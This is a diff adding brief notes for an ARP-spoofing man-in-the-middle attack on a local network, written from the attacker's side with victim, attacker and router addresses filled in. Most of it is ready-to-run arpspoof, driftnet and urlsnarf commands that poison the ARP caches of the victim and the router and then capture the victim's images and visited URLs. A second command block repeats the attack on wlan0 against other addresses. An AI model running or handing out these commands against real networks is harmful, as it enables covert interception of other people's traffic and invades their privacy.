@@ -1,0 +1,36 @@
+ Victim IP address : 192.168.8.90
+
+Attacker network interface : eth0; with IP address : 192.168.8.93
+
+Router IP address : 192.168.8.8
+
+Requirements:
+
+1. Arpspoof
+
+2. Driftnet
+
+3. Urlsnarf
+
+ 1. Open your terminal (CTRL + ALT + T kali shortcut) and configure our Kali Linux machine to allow packet forwarding, because act as man in the middle attacker, Kali Linux must act as router between "real router" and the victim. Read the tutorial here how to set up packet forwarding in linux.
+
+2. You can change your terminal interface to make the view much more friendly and easy to monitor by splitting kali linux terminal window.
+
+3. The next step is setting up arpspoof between victim and router.
+
+============
+arpspoof -i eth0 -t 192.168.8.90 192.168.8.8   
+
+arpspoof -i eth0 192.168.8.8 192.168.8.90
+ 
+driftnet -i eth0
+
+urlsnarf -i eth0
+
+
+
+=======================
+arpspoof -i wlan0 -t 10.6.39.3 10.5.101.1
+arpspoof -i wlan0 10.5.101.1 10.6.39.3
+driftnet -i wlan0
+urlsnarf -i wlan0
